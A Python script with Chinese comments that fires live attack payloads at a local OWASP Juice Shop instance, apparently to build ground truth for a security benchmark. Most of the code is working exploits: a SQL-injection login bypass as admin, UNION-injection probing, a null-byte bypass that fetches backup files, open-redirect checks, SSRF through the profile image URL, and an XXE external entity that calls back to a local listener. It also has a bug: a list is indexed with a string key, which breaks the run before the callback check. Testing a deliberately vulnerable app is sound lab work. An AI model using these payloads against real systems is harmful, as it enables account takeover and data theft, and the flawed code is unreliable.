#!/usr/bin/env python3
"""probe2.py —— 在 Juice Shop 上逐条实测攻击可行性（先探测，再写 ground truth）

原则：**不猜**。每条都真发请求，打印 status / 长度 / 关键片段。
探测结果决定 ground truth 里哪些能进、按什么判据判。
"""
import http.client
import json
import os
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:3001"
HOST, PORT = "127.0.0.1", 3001
HERE = os.path.dirname(os.path.abspath(__file__))
ART = json.load(open(os.path.join(HERE, "artifacts.json"), encoding="utf-8"))
OAST = "http://127.0.0.1:8897"


def opener():
    return urllib.request.build_opener(urllib.request.ProxyHandler({}))


def req(method, path, body=None, token=None, ctype="application/json", headers=None):
    op = opener()
    data = None
    hdrs = dict(headers or {})
    if body is not None:
        if ctype == "application/json":
            data = json.dumps(body).encode()
        elif ctype == "raw":
            data = body.encode() if isinstance(body, str) else body
        else:
            data = urllib.parse.urlencode(body).encode()
        hdrs.setdefault("Content-Type", ctype if ctype != "raw" else "text/plain")
    if token:
        hdrs["Authorization"] = "Bearer " + token
    r = urllib.request.Request(BASE + path, data=data, method=method, headers=hdrs)
    try:
        with op.open(r, timeout=20) as resp:
            return resp.status, resp.read().decode("utf-8", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
    except Exception as e:
        return 0, "ERR %s" % e, {}


def raw_get(path):
    """/ftp/ 这类目录列表在 urllib 下会 IncompleteRead，用 http.client 直读。"""
    c = http.client.HTTPConnection(HOST, PORT, timeout=20)
    try:
        c.request("GET", path)
        r = c.getresponse()
        body = r.read()
        return r.status, body.decode("utf-8", "replace"), dict(r.getheaders())
    except Exception as e:
        return 0, "ERR %s" % e, {}
    finally:
        c.close()


def show(tag, st, body, keys=None, limit=200):
    print("\n### %s -> %s (len=%d)" % (tag, st, len(body)))
    if keys:
        for k in keys:
            v = body
            try:
                for part in k.split("."):
                    v = v[int(part)] if isinstance(v, list) else v[part]
            except Exception:
                continue
            print("    %-22s = %r" % (k, str(v)[:110]))
    print("    " + body[:limit].replace("\n", " ").strip())


A = ART["users"]["a"]["token"]
B = ART["users"]["b"]["token"]
ABID = ART["users"]["a"]["bid"]
BBID = ART["users"]["b"]["bid"]
AUID = 25  # 由 recon 的 basket_own 响应给出；下面会用实测覆盖

results = {}

# 0) 先确认 A 的 uid（不靠硬编码）
st, body, _ = req("GET", "/rest/basket/%s" % ABID, token=A)
try:
    AUID = json.loads(body)["data"]["UserId"]
except Exception:
    pass
st, body, _ = req("GET", "/rest/basket/%s" % BBID, token=B)
BUID = None
try:
    BUID = json.loads(body)["data"]["UserId"]
except Exception:
    pass
print("identity: A_uid=%s bid=%s | B_uid=%s bid=%s" % (AUID, ABID, BUID, BBID))
results["identity"] = {"a_uid": AUID, "a_bid": ABID, "b_uid": BUID, "b_bid": BBID}

# 1) 登录口 SQL 注入（auth bypass）
st, body, _ = req("POST", "/rest/user/login", {"email": "admin@juice-sh.op' --", "password": "x"})
show("login-sqli admin' --", st, body, keys=["authentication.umail", "authentication.bid"])
results["login_sqli"] = {"status": st, "has_admin": "admin@juice-sh.op" in body,
                         "has_token": '"token"' in body}

# 1b) 对照：错误口令
st, body, _ = req("POST", "/rest/user/login", {"email": "admin@juice-sh.op", "password": "wrong-pass-xyz"})
show("login control (wrong pass)", st, body)
results["login_control"] = {"status": st}

# 2) 搜索口 union 注入：先摸列数
for q in ["apple')) UNION SELECT 1--",
          "apple')) UNION SELECT 1,2--",
          "apple')) UNION SELECT 1,2,3,4,5,6,7,8,9--"]:
    st, body, _ = req("GET", "/rest/products/search?q=" + urllib.parse.quote(q))
    note = body[:120].replace("\n", " ")
    print("  union probe [%s] -> %s %s" % (q[:36], st, note[:100]))
    results.setdefault("union_probe", []).append({"q": q, "status": st})

MARKER = "UNIONCANARY%d" % int(time.time())
q = "apple')) UNION SELECT 1,2,3,4,5,'%s',7,8,9--" % MARKER
st, body, _ = req("GET", "/rest/products/search?q=" + urllib.parse.quote(q))
show("union marker (%s)" % MARKER, st, body, limit=300)
results["union"] = {"marker": MARKER, "status": st, "marker_in_body": MARKER in body}

# 3) 目录列表 /ftp/
st, body, _ = raw_get("/ftp/")
show("ftp dir listing", st, body, limit=300)
results["ftp"] = {"status": st, "has_md": "acquisitions.md" in body,
                  "files": [x for x in ("acquisitions.md", "package.json.bak", "incident-support.kdbx",
                                        "coupons_2013.md.bak", "eastere.gg", "legal.md") if x in body]}

# 4) null byte 绕过拿备份
st, body, _ = raw_get("/ftp/package.json.bak%2500.md")
show("null-byte package.json.bak%%2500.md", st, body, limit=300)
results["nullbyte"] = {"status": st, "has_pkg": "juice-shop" in body}

# 5) 开放重定向
for p in ["/redirect?to=https://example.org",
          "/?to=https://example.org"]:
    st, body, hdr = req("GET", p)
    print("  redirect [%s] -> %s Location=%s" % (p, st, hdr.get("Location")))
    results.setdefault("redirect", []).append({"path": p, "status": st,
                                               "location": hdr.get("Location")})

# 6) /metrics 暴露
st, body, _ = req("GET", "/metrics")
show("metrics", st, body, limit=150)
results["metrics"] = {"status": st, "has_help": "# HELP" in body, "has_prefix": "juiceshop_" in body}

# 7) 未授权 /api/Users
st, body, _ = req("GET", "/api/Users")
show("api/Users no auth", st, body, limit=120)
results["users_noauth"] = {"status": st}

# 8) SSRF：用 OAST 探（blind，响应体不会有证据）
tok = "ssrf%d" % int(time.time())
st, body, _ = req("POST", "/profile", {"image": "http://127.0.0.1:8897/oast/%s" % tok}, token=A)
show("ssrf via /profile image", st, body, limit=200)
results["ssrf_profile"] = {"status": st, "token": tok}

# 8b) 另一条常见 SSRF 面：/api/Products 的 image? 或 /rest/user/avatar?
st, body, _ = req("GET", "/api/Users/1", token=A)
show("api/Users/1 as normal user", st, body, keys=["data.email", "data.role"], limit=150)
results["user1_as_user"] = {"status": st}

# 9) XXE：把带外实体塞进 XML 接口
tok2 = "xxe%d" % int(time.time())
xml = ('<?xml version="1.0" encoding="UTF-8"?>'
       '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8897/oast/%s">]>'
       '<feedback><comment>&xxe;</comment><rating>1</rating></feedback>' % tok2)
for path, ctype in (("/api/Feedbacks", "application/xml"), ("/rest/products/search", "application/xml")):
    st, body, _ = req("POST", path, xml, token=A, ctype="raw",
                      headers={"Content-Type": ctype})
    print("  xxe [%s] -> %s %s" % (path, st, body[:100].replace("\n", " ")))
    results.setdefault("xxe", []).append({"path": path, "status": st})
results["xxe"]["token"] = tok2

print("\n\n===== OAST 回连检查 =====")
for tok in (tok, tok2):
    try:
        with opener().open(OAST + "/__hits/" + tok, timeout=5) as r:
            d = json.loads(r.read().decode())
        print("  token=%-12s hits=%d" % (tok, d.get("count", 0)))
        for h in (d.get("hits") or [])[:3]:
            print("      ua=%r path=%s" % (h.get("user_agent"), h.get("path")))
        results.setdefault("oast", {})[tok] = d.get("count", 0)
    except Exception as e:
        print("  token=%-12s OAST ERR %s" % (tok, e))

with open(os.path.join(HERE, "gt", "probe2_results.json"), "w", encoding="utf-8") as f:
    json.dump(results, f, ensure_ascii=False, indent=2)
print("\n[saved] gt/probe2_results.json")
